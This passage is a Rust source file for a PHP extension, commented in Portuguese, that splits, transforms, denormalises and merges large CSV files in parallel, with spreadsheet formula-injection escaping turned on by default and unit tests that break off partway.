#[cfg(feature = "extension")]
use ext_php_rs::prelude::*;
use memmap2::Mmap;
use rayon::prelude::*;
use std::borrow::Cow;
use std::fs::File;
use std::io::Write;
use std::path::Path;

use crate::layout::{parse_columns, ColumnConfig};
use crate::operations::apply_op;

#[cfg_attr(feature = "extension", php_class)]
pub struct FileProcessor;

// ==========================================================
// Helpers CSV (privados ao módulo)
// ==========================================================

const CSV_WRITE_BUFFER: usize = 1024 * 1024;

fn max_output_index(columns: &[ColumnConfig]) -> usize {
    columns.iter().map(|c| c.output_index).max().unwrap_or(0) + 1
}

fn parse_delimiter(delim: &str, default: u8) -> u8 {
    delim.bytes().next().unwrap_or(default)
}

/// Traduz uma string vinda do PHP para `csv::QuoteStyle`.
///
/// - `"necessary"` (default) — RFC 4180: quota campos que contenham o
///   delimiter, quote char ou newline. Correto pra leitores CSV padrão.
/// - `"always"` — quota TODOS os campos. Útil quando o consumer espera
///   delimitadores sempre dentro de aspas.
/// - `"never"` — nunca quota. Necessário pra SQL Server `bcp` e outros
///   consumers que não entendem RFC 4180. **Atenção**: se algum campo
///   conter o delimiter, o output fica corrompido (sem forma de escape).
///   Responsabilidade do layout de ops manter os dados "limpos".
fn parse_quote_style(s: &str) -> Result<csv::QuoteStyle, String> {
    match s {
        "necessary" => Ok(csv::QuoteStyle::Necessary),
        "always" => Ok(csv::QuoteStyle::Always),
        "never" => Ok(csv::QuoteStyle::Never),
        other => Err(format!(
            "unknown quote_style '{}'; expected one of: necessary, always, never",
            other
        )),
    }
}

/// Detecta se um campo começa com caractere que dispara interpretação de
/// fórmula em Excel/Sheets/Calc. Inclui os vetores clássicos (`=`, `+`, `-`, `@`)
/// e as variações via tab/CR que alguns parsers tratam como continuação.
///
/// Ver [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection).
#[inline]
fn needs_formula_escape(s: &str) -> bool {
    matches!(
        s.bytes().next(),
        Some(b'=') | Some(b'+') | Some(b'-') | Some(b'@') | Some(b'\t') | Some(b'\r')
    )
}

/// Calcula N+1 boundaries em `data` alinhadas a `\n`, dividindo em N
/// ranges aproximadamente iguais em bytes mas sempre terminando em quebra
/// de linha. Garante que nenhum range parte uma linha no meio.
///
/// Usado tanto pelo split em disco (`split_file_impl`) quanto pelo
/// pipeline single-pass (`process_parallel_impl`).
fn compute_line_boundaries(data: &[u8], n: usize) -> Vec<usize> {
    let len = data.len();
    let mut boundaries = Vec::with_capacity(n + 1);
    boundaries.push(0usize);
    for i in 1..n {
        let approx = len * i / n;
        let adjusted = match data[approx..].iter().position(|&b| b == b'\n') {
            Some(off) => approx + off + 1,
            None => len,
        };
        boundaries.push(adjusted);
    }
    boundaries.push(len);
    boundaries
}

fn csv_reader<R: std::io::Read>(delim: u8, has_headers: bool, reader: R) -> csv::Reader<R> {
    csv::ReaderBuilder::new()
        .delimiter(delim)
        .has_headers(has_headers)
        .flexible(true)
        .from_reader(reader)
}

fn csv_writer<W: std::io::Write>(
    delim: u8,
    quote_style: csv::QuoteStyle,
    writer: W,
) -> csv::Writer<W> {
    csv::WriterBuilder::new()
        .delimiter(delim)
        .terminator(csv::Terminator::Any(b'\n'))
        .buffer_capacity(CSV_WRITE_BUFFER)
        .quote_style(quote_style)
        .from_writer(writer)
}

/// Processa records **com fan-out** ("denormalize"): cada linha de entrada
/// com formato `<S colunas estáticas> + <repetições de G colunas>` vira
/// múltiplas linhas de saída, uma por grupo.
///
/// Exemplo com `static_cols=1, group_size=2`:
/// ```text
/// input:   doc ; ddd1 ; ph1 ; ddd2 ; ph2 ; ddd3 ; ph3
/// output:  doc ; ddd1 ; ph1
///          doc ; ddd2 ; ph2
///          doc ; ddd3 ; ph3
/// ```
///
/// O layout `columns` descreve **uma linha normalizada de saída**. Os `in`
/// dos `ColumnConfig` são índices de uma "linha virtual" de largura
/// `static_cols + group_size`:
/// - `in < static_cols` → pega da coluna estática do input
/// - `in >= static_cols` → pega da posição correspondente DENTRO do grupo atual
///
/// Cada grupo vira uma tentativa de linha de saída; validators rodam por
/// linha de saída. Uma combinação `(doc, dddN, phN)` pode ser inválida
/// enquanto outra `(doc, dddM, phM)` do mesmo doc é válida — ambos casos
/// são tratados corretamente.
///
/// **`emit_prefix_on_all_invalid`:** quando `true`, se o prefixo (colunas
/// estáticas) passa nos validators mas **nenhum grupo** foi emitido com
/// sucesso para essa linha de entrada, emite **uma linha fallback** com
/// apenas as colunas do prefixo preenchidas e as colunas do grupo em
/// branco. Útil quando o documento é a chave obrigatória e outros campos
/// (DDD, phone) podem estar ruins — nesses casos, você preserva o
/// documento mesmo sem telefone válido.
///
/// **Edge cases:**
/// - Linha com menos de `static_cols` colunas → pulada (zero saídas).
/// - Grupo parcial no final (ex.: sobrou 1 coluna com `group_size=2`) →
///   ignora o lixo e emite só os grupos completos.
/// - Linha com prefixo válido mas zero grupos (ex.: só o documento) →
///   com `emit_prefix_on_all_invalid=true`, emite uma linha só com o
///   prefixo; com `false`, zero saídas.
/// - Prefixo falha na validação (ex.: documento inválido) → linha inteira
///   dropada, nenhuma saída (nem fallback).
/// - `group_size=0` retorna erro de validação de parâmetros.
///
/// Retorna `(input_count, output_count, invalid_count)`:
/// - `input_count` — linhas lidas do input
/// - `output_count` — linhas de saída efetivamente escritas (inclui
///   eventuais fallbacks prefix-only quando `emit_prefix_on_all_invalid`)
/// - `invalid_count` — tentativas de grupo dropadas por validator. Uma
///   linha com 3 grupos todos ruins contribui 3 aqui; se
///   `emit_prefix_on_all_invalid=true`, ainda assim sai 1 em `output_count`
#[allow(clippy::too_many_arguments)]
pub fn process_records_denormalize<R: std::io::Read, W: std::io::Write>(
    reader: R,
    writer: W,
    input_delimiter: u8,
    output_delimiter: u8,
    skip_header: bool,
    columns: &[ColumnConfig],
    static_cols: usize,
    group_size: usize,
    escape_formulas: bool,
    quote_style: csv::QuoteStyle,
    emit_prefix_on_all_invalid: bool,
) -> Result<(i64, i64, i64), String> {
    if group_size == 0 {
        return Err("group_size must be >= 1".to_string());
    }
    // Valida que o layout não referencia colunas fora da linha virtual.
    let virtual_width = static_cols + group_size;
    for (idx, col) in columns.iter().enumerate() {
        if col.input_index >= virtual_width {
            return Err(format!(
                "column {}: input_index {} exceeds virtual row width {} (static_cols={} + group_size={})",
                idx, col.input_index, virtual_width, static_cols, group_size
            ));
        }
    }

    let max_out = max_output_index(columns);
    let mut rdr = csv_reader(input_delimiter, skip_header, reader);
    let mut wtr = csv_writer(output_delimiter, quote_style, writer);

    let mut input_count = 0i64;
    let mut output_count = 0i64;
    let mut invalid_count = 0i64;
    let mut out_row: Vec<String> = vec![String::new(); max_out];
    // prefix_row: linha de saída com apenas as colunas de prefixo preenchidas.
    // Construída uma vez por record e reutilizada como base para cada grupo,
    // e como fallback quando nenhum grupo é emitido.
    let mut prefix_row: Vec<String> = vec![String::new(); max_out];

    for result in rdr.records() {
        let record = result.map_err(|e| e.to_string())?;
        input_count += 1;

        let num_cols = record.len();
        if num_cols < static_cols {
            continue; // não cabe nem o prefixo
        }

        // === Passo 1: construir e validar o prefixo uma única vez ===
        for slot in prefix_row.iter_mut() {
            slot.clear();
        }
        let mut prefix_valid = true;
        for col in columns.iter().filter(|c| c.input_index < static_cols) {
            let val = record.get(col.input_index).unwrap_or("");
            let mut transformed: Cow<'_, str> = Cow::Borrowed(val);
            for op in &col.ops {
                transformed = apply_op(op, transformed);
            }
            if let Some(v) = &col.validate {
                if !v.check(&transformed) {
                    prefix_valid = false;
                    break;
                }
            }
            prefix_row[col.output_index].push_str(&transformed);
        }
        if !prefix_valid {
            // Prefixo (ex: documento) inválido → descarta a linha toda,
            // nenhuma saída (nem fallback).
            continue;
        }

        // === Passo 2: iterar grupos, emitir os válidos ===
        let num_groups = (num_cols - static_cols) / group_size;
        let mut groups_emitted = 0i64;

        for group_idx in 0..num_groups {
            // Copia prefixo pré-computado para out_row
            for (dst, src) in out_row.iter_mut().zip(prefix_row.iter()) {
                dst.clear();
                dst.push_str(src);
            }

            let mut group_valid = true;
            for col in columns.iter().filter(|c| c.input_index >= static_cols) {
                let offset_in_group = col.input_index - static_cols;
                let actual_idx = static_cols + group_idx * group_size + offset_in_group;
                let val = record.get(actual_idx).unwrap_or("");
                let mut transformed: Cow<'_, str> = Cow::Borrowed(val);
                for op in &col.ops {
                    transformed = apply_op(op, transformed);
                }
                if let Some(v) = &col.validate {
                    if !v.check(&transformed) {
                        group_valid = false;
                        break;
                    }
                }
                out_row[col.output_index].push_str(&transformed);
            }

            if !group_valid {
                invalid_count += 1;
                continue;
            }

            if escape_formulas {
                for slot in out_row.iter_mut() {
                    if needs_formula_escape(slot) {
                        slot.insert(0, '\'');
                    }
                }
            }

            wtr.write_record(out_row.iter())
                .map_err(|e| e.to_string())?;
            output_count += 1;
            groups_emitted += 1;
        }

        // === Passo 3: fallback prefix-only ===
        // Se prefixo passou, mas nenhum grupo foi escrito, opcionalmente
        // emite uma única linha com só o prefixo (colunas do grupo em branco).
        if emit_prefix_on_all_invalid && groups_emitted == 0 {
            if escape_formulas {
                for slot in prefix_row.iter_mut() {
                    if needs_formula_escape(slot) {
                        slot.insert(0, '\'');
                    }
                }
            }
            wtr.write_record(prefix_row.iter())
                .map_err(|e| e.to_string())?;
            output_count += 1;
        }
    }
    wtr.flush().map_err(|e| e.to_string())?;

    Ok((input_count, output_count, invalid_count))
}

/// Processa todos os records de `reader` aplicando `columns` e escreve em
/// `writer`. Genérico em `Read`/`Write` — qualquer fonte que implemente
/// `Read` serve (arquivo, `&[u8]`, `Cursor<Vec<u8>>`, socket).
///
/// Quando `escape_formulas` é `true`, campos de saída que começam com `=`,
/// `+`, `-`, `@`, `\t` ou `\r` recebem um prefixo `'` para neutralizar
/// CSV formula injection caso o output seja aberto em Excel/Sheets/Calc.
///
/// `quote_style` controla o quoting do `csv::Writer` (ver
/// [`parse_quote_style`]). Default caller-chosen: `Necessary` é RFC 4180
/// seguro; `Never` é pra bcp/consumers que não entendem quoting.
///
/// Propaga erros de leitura (record mal formado) e escrita. Para o caso de
/// processamento por chunks em paralelo, onde queremos resiliência por chunk,
/// use diretamente o loop de `process_chunks_impl` que faz continue/break
/// conforme o tipo de erro.
///
/// Retorna `(input_count, output_count, invalid_count)`.
#[allow(clippy::too_many_arguments)]
pub fn process_records<R: std::io::Read, W: std::io::Write>(
    reader: R,
    writer: W,
    input_delimiter: u8,
    output_delimiter: u8,
    skip_header: bool,
    columns: &[ColumnConfig],
    escape_formulas: bool,
    quote_style: csv::QuoteStyle,
) -> Result<(i64, i64, i64), String> {
    let max_out = max_output_index(columns);
    let mut rdr = csv_reader(input_delimiter, skip_header, reader);
    let mut wtr = csv_writer(output_delimiter, quote_style, writer);

    let mut input_count = 0i64;
    let mut output_count = 0i64;
    let mut out_row: Vec<String> = vec![String::new(); max_out];

    for result in rdr.records() {
        let record = result.map_err(|e| e.to_string())?;
        input_count += 1;
        let written =
            transform_and_write(&record, columns, &mut out_row, &mut wtr, escape_formulas)
                .map_err(|e| e.to_string())?;
        if written {
            output_count += 1;
        }
    }
    wtr.flush().map_err(|e| e.to_string())?;

    Ok((input_count, output_count, input_count - output_count))
}

/// Aplica o layout numa record e escreve a saída se for válida.
/// Retorna `Ok(true)` se a linha foi escrita, `Ok(false)` se foi descartada
/// por um validator, e `Err` apenas se o writer CSV falhar.
///
/// Quando `escape_formulas` é `true`, campos que começam com caracteres
/// interpretados como fórmula por planilhas (`=`, `+`, `-`, `@`, `\t`, `\r`)
/// são prefixados com `'` antes da escrita. Mitiga CSV formula injection
/// (OWASP) caso o CSV de saída venha a ser aberto em Excel/Sheets/Calc.
fn transform_and_write<W: std::io::Write>(
    record: &csv::StringRecord,
    columns: &[ColumnConfig],
    out_row: &mut [String],
    wtr: &mut csv::Writer<W>,
    escape_formulas: bool,
) -> csv::Result<bool> {
    for slot in out_row.iter_mut() {
        slot.clear();
    }
    for col in columns {
        let val = record.get(col.input_index).unwrap_or("");
        let mut transformed: Cow<'_, str> = Cow::Borrowed(val);
        for op in &col.ops {
            transformed = apply_op(op, transformed);
        }
        if let Some(v) = &col.validate {
            if !v.check(&transformed) {
                return Ok(false);
            }
        }
        out_row[col.output_index].push_str(&transformed);
    }
    if escape_formulas {
        for slot in out_row.iter_mut() {
            if needs_formula_escape(slot) {
                slot.insert(0, '\'');
            }
        }
    }
    wtr.write_record(out_row.iter())?;
    Ok(true)
}

// ==========================================================
// Lógica pura (sempre disponível, testável sem PHP runtime)
// ==========================================================

impl FileProcessor {
    /// Divide arquivo em N chunks em disco. Retorna contagem de linhas por chunk.
    pub fn split_file_impl(
        &self,
        input_path: &str,
        output_dir: &str,
        chunks: i64,
    ) -> Result<Vec<i64>, String> {
        let file = File::open(input_path).map_err(|e| e.to_string())?;
        let mmap = unsafe { Mmap::map(&file).map_err(|e| e.to_string())? };
        let data: &[u8] = &mmap;
        let n = chunks.max(1) as usize;

        let boundaries = compute_line_boundaries(data, n);

        std::fs::create_dir_all(output_dir).map_err(|e| e.to_string())?;

        let counts: Result<Vec<i64>, String> = (0..n)
            .into_par_iter()
            .map(|i| -> Result<i64, String> {
                let start = boundaries[i];
                let end = boundaries[i + 1];
                let slice = &data[start..end];
                let path = format!("{}/input_{}.csv", output_dir, i);
                let mut out = File::create(&path).map_err(|e| e.to_string())?;
                out.write_all(slice).map_err(|e| e.to_string())?;
                let mut count = slice.iter().filter(|&&b| b == b'\n').count() as i64;
                if !slice.is_empty() && *slice.last().unwrap() != b'\n' {
                    count += 1;
                }
                Ok(count)
            })
            .collect();

        counts
    }

    /// Processa arquivo único aplicando layout. Retorna [input, output, invalid].
    ///
    /// `escape_formulas` previne CSV formula injection ao prefixar com `'`
    /// campos de saída que começariam com `=`/`+`/`-`/`@`/`\t`/`\r`. Default
    /// seguro: recomendado manter em `true` exceto para pipelines internos
    /// onde o CSV de saída nunca será aberto em planilha.
    ///
    /// `quote_style` controla o quoting do CSV de saída: `"necessary"` (RFC
    /// 4180, default), `"always"` ou `"never"` (para SQL Server bcp e outros
    /// consumers sem suporte a quoting).
    #[allow(clippy::too_many_arguments)]
    pub fn process_file_impl(
        &self,
        input_path: &str,
        output_path: &str,
        input_delimiter: &str,
        output_delimiter: &str,
        skip_header: bool,
        columns_json: &str,
        escape_formulas: bool,
        quote_style: &str,
    ) -> Result<Vec<i64>, String> {
        let columns = parse_columns(columns_json)?;
        let in_delim = parse_delimiter(input_delimiter, b';');
        let out_delim = parse_delimiter(output_delimiter, b';');
        let qs = parse_quote_style(quote_style)?;

        let file = File::open(input_path).map_err(|e| e.to_string())?;
        let mmap = unsafe { Mmap::map(&file).map_err(|e| e.to_string())? };
        let data: &[u8] = &mmap;

        let out_file = File::create(output_path).map_err(|e| e.to_string())?;

        let (input, output, invalid) = process_records(
            data,
            out_file,
            in_delim,
            out_delim,
            skip_header,
            &columns,
            escape_formulas,
            qs,
        )?;

        Ok(vec![input, output, invalid])
    }

    /// Processa todos os chunks em paralelo. Retorna [input, output, invalid] totais.
    ///
    /// Ver `process_file_impl` para a descrição de `escape_formulas` e
    /// `quote_style`.
    #[allow(clippy::too_many_arguments)]
    pub fn process_chunks_impl(
        &self,
        dir: &str,
        chunks: i64,
        input_delimiter: &str,
        output_delimiter: &str,
        skip_header: bool,
        columns_json: &str,
        escape_formulas: bool,
        quote_style: &str,
    ) -> Result<Vec<i64>, String> {
        let columns = parse_columns(columns_json)?;
        let in_delim = parse_delimiter(input_delimiter, b';');
        let out_delim = parse_delimiter(output_delimiter, b';');
        let qs = parse_quote_style(quote_style)?;
        let n = chunks as usize;
        let max_out = max_output_index(&columns);

        let results: Vec<(i64, i64, i64)> = (0..n)
            .into_par_iter()
            .map(|i| {
                let in_path = format!("{}/input_{}.csv", dir, i);
                let out_path = format!("{}/output_{}.csv", dir, i);

                let file = match File::open(&in_path) {
                    Ok(f) => f,
                    Err(_) => return (0, 0, 0),
                };
                let mmap = match unsafe { Mmap::map(&file) } {
                    Ok(m) => m,
                    Err(_) => return (0, 0, 0),
                };
                let data: &[u8] = &mmap;

                let has_headers = skip_header && i == 0;
                let mut rdr = csv_reader(in_delim, has_headers, data);

                let out_file = match File::create(&out_path) {
                    Ok(f) => f,
                    Err(_) => return (0, 0, 0),
                };
                let mut wtr = csv_writer(out_delim, qs, out_file);

                let mut input_count = 0i64;
                let mut output_count = 0i64;
                let mut out_row: Vec<String> = vec![String::new(); max_out];

                for result in rdr.records() {
                    let record = match result {
                        Ok(r) => r,
                        Err(_) => continue,
                    };
                    input_count += 1;
                    match transform_and_write(
                        &record,
                        &columns,
                        &mut out_row,
                        &mut wtr,
                        escape_formulas,
                    ) {
                        Ok(true) => output_count += 1,
                        Ok(false) => {} // descartada por validator
                        Err(_) => break, // falha ao escrever
                    }
                }
                let _ = wtr.flush();

                (input_count, output_count, input_count - output_count)
            })
            .collect();

        let mut totals = (0i64, 0i64, 0i64);
        for r in results {
            totals.0 += r.0;
            totals.1 += r.1;
            totals.2 += r.2;
        }
        Ok(vec![totals.0, totals.1, totals.2])
    }

    /// Pipeline single-pass: mmap do input, paraleliza N ranges em threads
    /// rayon (cada thread processa seu range e escreve num buffer de
    /// memória), concatena os buffers no output final. Zero arquivos
    /// temporários, ~3x menos I/O comparado ao fluxo split + chunks + merge.
    ///
    /// Preserva a ordem das linhas porque os buffers são escritos em
    /// ordem de chunk (0, 1, 2, ...).
    ///
    /// Retorna `[input_total, output_total, invalid_total]`.
    ///
    /// Use esse método para o caso comum. O fluxo de 3 chamadas
    /// (`split_file_impl` + `process_chunks_impl` + `merge_files_impl`)
    /// continua disponível para quando você precisa de checkpoints em
    /// disco entre etapas (ex.: retomar um pipeline depois de crash).
    #[allow(clippy::too_many_arguments)]
    pub fn process_parallel_impl(
        &self,
        input_path: &str,
        output_path: &str,
        chunks: i64,
        input_delimiter: &str,
        output_delimiter: &str,
        skip_header: bool,
        columns_json: &str,
        escape_formulas: bool,
        quote_style: &str,
    ) -> Result<Vec<i64>, String> {
        let columns = parse_columns(columns_json)?;
        let in_delim = parse_delimiter(input_delimiter, b';');
        let out_delim = parse_delimiter(output_delimiter, b';');
        let qs = parse_quote_style(quote_style)?;
        let n = chunks.max(1) as usize;

        let file = File::open(input_path).map_err(|e| e.to_string())?;
        let mmap = unsafe { Mmap::map(&file).map_err(|e| e.to_string())? };
        let data: &[u8] = &mmap;

        let boundaries = compute_line_boundaries(data, n);

        // Cada thread processa seu range de bytes e escreve num Vec<u8>
        // próprio (sem contention). `has_headers` só no chunk 0.
        let results: Result<Vec<(Vec<u8>, i64, i64, i64)>, String> = (0..n)
            .into_par_iter()
            .map(|i| -> Result<(Vec<u8>, i64, i64, i64), String> {
                let start = boundaries[i];
                let end = boundaries[i + 1];
                let slice = &data[start..end];
                let has_headers = skip_header && i == 0;
                // Capacidade inicial ~= tamanho do input slice. Output
                // costuma ser <= input após ops/validate.
                let mut buffer: Vec<u8> = Vec::with_capacity(slice.len());
                let (input, output, invalid) = process_records(
                    slice,
                    &mut buffer,
                    in_delim,
                    out_delim,
                    has_headers,
                    &columns,
                    escape_formulas,
                    qs,
                )?;
                Ok((buffer, input, output, invalid))
            })
            .collect();
        let results = results?;

        // Serializa a escrita final. BufWriter reduz syscalls porque cada
        // buffer costuma ser grande (MBs) e write_all emitiria um write
        // gigante — BufWriter quebra em pedaços de 8KB por default, o que
        // é ok pro kernel. A ordem dos buffers preserva a ordem das linhas.
        let out_file = File::create(output_path).map_err(|e| e.to_string())?;
        let mut writer = std::io::BufWriter::new(out_file);
        let mut totals = (0i64, 0i64, 0i64);
        for (buffer, input, output, invalid) in results {
            writer.write_all(&buffer).map_err(|e| e.to_string())?;
            totals.0 += input;
            totals.1 += output;
            totals.2 += invalid;
        }
        writer.flush().map_err(|e| e.to_string())?;

        Ok(vec![totals.0, totals.1, totals.2])
    }

    /// Variante de `process_parallel_impl` com **fan-out**: cada linha de
    /// input desnormaliza em N linhas de output.
    ///
    /// Formato do input esperado: `<S colunas estáticas> + <M grupos de G colunas>`.
    /// Cada grupo vira uma linha de saída composta por `<estáticas> + <grupo>`.
    ///
    /// `columns_json` descreve **uma linha normalizada de saída** — os `in`
    /// dos columns são índices da linha virtual de tamanho
    /// `static_cols + group_size`, não do arquivo de entrada bruto. Ver
    /// [`process_records_denormalize`] para detalhes, incluindo o
    /// significado de `emit_prefix_on_all_invalid`.
    #[allow(clippy::too_many_arguments)]
    pub fn process_parallel_denormalize_impl(
        &self,
        input_path: &str,
        output_path: &str,
        chunks: i64,
        input_delimiter: &str,
        output_delimiter: &str,
        skip_header: bool,
        static_cols: i64,
        group_size: i64,
        columns_json: &str,
        escape_formulas: bool,
        quote_style: &str,
        emit_prefix_on_all_invalid: bool,
    ) -> Result<Vec<i64>, String> {
        if static_cols < 0 {
            return Err("static_cols must be >= 0".to_string());
        }
        if group_size <= 0 {
            return Err("group_size must be >= 1".to_string());
        }
        let columns = parse_columns(columns_json)?;
        let in_delim = parse_delimiter(input_delimiter, b';');
        let out_delim = parse_delimiter(output_delimiter, b';');
        let qs = parse_quote_style(quote_style)?;
        let n = chunks.max(1) as usize;
        let static_cols_u = static_cols as usize;
        let group_size_u = group_size as usize;

        // Valida bounds antes de abrir o arquivo
        let virtual_width = static_cols_u + group_size_u;
        for (idx, col) in columns.iter().enumerate() {
            if col.input_index >= virtual_width {
                return Err(format!(
                    "column {}: input_index {} exceeds virtual row width {} (static_cols={} + group_size={})",
                    idx, col.input_index, virtual_width, static_cols_u, group_size_u
                ));
            }
        }

        let file = File::open(input_path).map_err(|e| e.to_string())?;
        let mmap = unsafe { Mmap::map(&file).map_err(|e| e.to_string())? };
        let data: &[u8] = &mmap;

        let boundaries = compute_line_boundaries(data, n);

        // Cada thread processa seu range. Output pode ser MAIOR que input
        // (fan-out expande 1 linha em N), então alocamos capacidade maior.
        let results: Result<Vec<(Vec<u8>, i64, i64, i64)>, String> = (0..n)
            .into_par_iter()
            .map(|i| -> Result<(Vec<u8>, i64, i64, i64), String> {
                let start = boundaries[i];
                let end = boundaries[i + 1];
                let slice = &data[start..end];
                let has_headers = skip_header && i == 0;
                let mut buffer: Vec<u8> = Vec::with_capacity(slice.len() * 2);
                let (input, output, invalid) = process_records_denormalize(
                    slice,
                    &mut buffer,
                    in_delim,
                    out_delim,
                    has_headers,
                    &columns,
                    static_cols_u,
                    group_size_u,
                    escape_formulas,
                    qs,
                    emit_prefix_on_all_invalid,
                )?;
                Ok((buffer, input, output, invalid))
            })
            .collect();
        let results = results?;

        let out_file = File::create(output_path).map_err(|e| e.to_string())?;
        let mut writer = std::io::BufWriter::new(out_file);
        let mut totals = (0i64, 0i64, 0i64);
        for (buffer, input, output, invalid) in results {
            writer.write_all(&buffer).map_err(|e| e.to_string())?;
            totals.0 += input;
            totals.1 += output;
            totals.2 += invalid;
        }
        writer.flush().map_err(|e| e.to_string())?;

        Ok(vec![totals.0, totals.1, totals.2])
    }

    /// Concatena arquivos output_*.csv em um único arquivo final.
    pub fn merge_files_impl(
        &self,
        input_dir: &str,
        output_path: &str,
        chunks: i64,
    ) -> Result<i64, String> {
        let mut out = File::create(output_path).map_err(|e| e.to_string())?;
        let mut total: i64 = 0;
        for i in 0..chunks {
            let path = format!("{}/output_{}.csv", input_dir, i);
            if !Path::new(&path).exists() {
                continue;
            }
            let data = std::fs::read(&path).map_err(|e| e.to_string())?;
            total += data.iter().filter(|&&b| b == b'\n').count() as i64;
            out.write_all(&data).map_err(|e| e.to_string())?;
        }
        Ok(total)
    }
}

// ==========================================================
// Camada PHP (somente compilada com feature "extension")
// ==========================================================

#[cfg(feature = "extension")]
#[php_impl]
impl FileProcessor {
    pub fn __construct() -> Self {
        Self
    }

    pub fn split_file(
        &self,
        input_path: String,
        output_dir: String,
        chunks: i64,
    ) -> PhpResult<Vec<i64>> {
        self.split_file_impl(&input_path, &output_dir, chunks)
            .map_err(Into::into)
    }

    #[allow(clippy::too_many_arguments)]
    pub fn process_file(
        &self,
        input_path: String,
        output_path: String,
        input_delimiter: String,
        output_delimiter: String,
        skip_header: bool,
        columns_json: String,
        escape_formulas: Option<bool>,
        quote_style: Option<String>,
    ) -> PhpResult<Vec<i64>> {
        self.process_file_impl(
            &input_path,
            &output_path,
            &input_delimiter,
            &output_delimiter,
            skip_header,
            &columns_json,
            escape_formulas.unwrap_or(true),
            quote_style.as_deref().unwrap_or("necessary"),
        )
        .map_err(Into::into)
    }

    #[allow(clippy::too_many_arguments)]
    pub fn process_chunks(
        &self,
        dir: String,
        chunks: i64,
        input_delimiter: String,
        output_delimiter: String,
        skip_header: bool,
        columns_json: String,
        escape_formulas: Option<bool>,
        quote_style: Option<String>,
    ) -> PhpResult<Vec<i64>> {
        self.process_chunks_impl(
            &dir,
            chunks,
            &input_delimiter,
            &output_delimiter,
            skip_header,
            &columns_json,
            escape_formulas.unwrap_or(true),
            quote_style.as_deref().unwrap_or("necessary"),
        )
        .map_err(Into::into)
    }

    pub fn merge_files(
        &self,
        input_dir: String,
        output_path: String,
        chunks: i64,
    ) -> PhpResult<i64> {
        self.merge_files_impl(&input_dir, &output_path, chunks)
            .map_err(Into::into)
    }

    #[allow(clippy::too_many_arguments)]
    pub fn process_parallel(
        &self,
        input_path: String,
        output_path: String,
        chunks: i64,
        input_delimiter: String,
        output_delimiter: String,
        skip_header: bool,
        columns_json: String,
        escape_formulas: Option<bool>,
        quote_style: Option<String>,
    ) -> PhpResult<Vec<i64>> {
        self.process_parallel_impl(
            &input_path,
            &output_path,
            chunks,
            &input_delimiter,
            &output_delimiter,
            skip_header,
            &columns_json,
            escape_formulas.unwrap_or(true),
            quote_style.as_deref().unwrap_or("necessary"),
        )
        .map_err(Into::into)
    }

    #[allow(clippy::too_many_arguments)]
    pub fn process_parallel_denormalize(
        &self,
        input_path: String,
        output_path: String,
        chunks: i64,
        input_delimiter: String,
        output_delimiter: String,
        skip_header: bool,
        static_cols: i64,
        group_size: i64,
        columns_json: String,
        escape_formulas: Option<bool>,
        quote_style: Option<String>,
        emit_prefix_on_all_invalid: Option<bool>,
    ) -> PhpResult<Vec<i64>> {
        self.process_parallel_denormalize_impl(
            &input_path,
            &output_path,
            chunks,
            &input_delimiter,
            &output_delimiter,
            skip_header,
            static_cols,
            group_size,
            &columns_json,
            escape_formulas.unwrap_or(true),
            quote_style.as_deref().unwrap_or("necessary"),
            emit_prefix_on_all_invalid.unwrap_or(false),
        )
        .map_err(Into::into)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicU64, Ordering};

    static DIR_COUNTER: AtomicU64 = AtomicU64::new(0);

    fn unique_temp_dir(name: &str) -> PathBuf {
        let id = DIR_COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!(
            "parallel_test_{}_{}_{}",
            name,
            std::process::id(),
            id
        ));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn write_file(path: &PathBuf, content: &str) {
        fs::write(path, content).unwrap();
    }

    fn read_file(path: &PathBuf) -> String {
        fs::read_to_string(path).unwrap()
    }

    fn path_str(p: &PathBuf) -> &str {
        p.to_str().unwrap()
    }

    // ===========================================================
    // split_file_impl
    // ===========================================================

    #[test]
    fn split_file_creates_expected_number_of_chunks() {
        let dir = unique_temp_dir("split_basic");
        let input = dir.join("input.csv");
        write_file(&input, "a,1\nb,2\nc,3\nd,4\ne,5\nf,6\n");

        let fp = FileProcessor;
        let counts = fp
            .split_file_impl(path_str(&input), path_str(&dir), 3)
            .unwrap();

        assert_eq!(counts.len(), 3);
        assert_eq!(counts.iter().sum::<i64>(), 6);
        assert!(dir.join("input_0.csv").exists());
        assert!(dir.join("input_1.csv").exists());
        assert!(dir.join("input_2.csv").exists());
    }

    #[test]
    fn split_file_respects_line_boundaries() {
        let dir = unique_temp_dir("split_boundaries");
        let input = dir.join("input.csv");
        write_file(&input, "aaaa\nbbbb\ncccc\ndddd\neeee\nffff\n");

        let fp = FileProcessor;
        fp.split_file_impl(path_str(&input), path_str(&dir), 2)
            .unwrap();

        let chunk0 = read_file(&dir.join("input_0.csv"));
        let chunk1 = read_file(&dir.join("input_1.csv"));
        assert!(chunk0.ends_with('\n'));
        assert!(chunk1.ends_with('\n'));
        assert_eq!(
            format!("{}{}", chunk0, chunk1),
            "aaaa\nbbbb\ncccc\ndddd\neeee\nffff\n"
        );
    }

    #[test]
    fn split_file_with_single_chunk() {
        let dir = unique_temp_dir("split_single");
        let input = dir.join("input.csv");
        write_file(&input, "a\nb\nc\n");

        let fp = FileProcessor;
        let counts = fp
            .split_file_impl(path_str(&input), path_str(&dir), 1)
            .unwrap();
        assert_eq!(counts, vec![3]);
        assert_eq!(read_file(&dir.join("input_0.csv")), "a\nb\nc\n");
    }

    #[test]
    fn split_file_counts_last_line_without_trailing_newline() {
        let dir = unique_temp_dir("split_no_trailing");
        let input = dir.join("input.csv");
        write_file(&input, "a\nb\nc"); // sem \n final

        let fp = FileProcessor;
        let counts = fp
            .split_file_impl(path_str(&input), path_str(&dir), 1)
            .unwrap();
        assert_eq!(counts, vec![3]);
    }

    // ===========================================================
    // process_records (in-memory, sem tmpdir)
    // ===========================================================

    use crate::layout::parse_columns;

    #[test]
    fn process_records_in_memory_applies_ops() {
        let input: &[u8] = b"alice;30\nbob;25\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[{"in":0,"out":0,"ops":["uppercase"]},{"in":1,"out":1,"ops":[]}]"#,
        )
        .unwrap();

        let (i, o, inv) = process_records(input, &mut output, b';', b';', false, &columns, true, csv::QuoteStyle::Necessary).unwrap();
        assert_eq!((i, o, inv), (2, 2, 0));
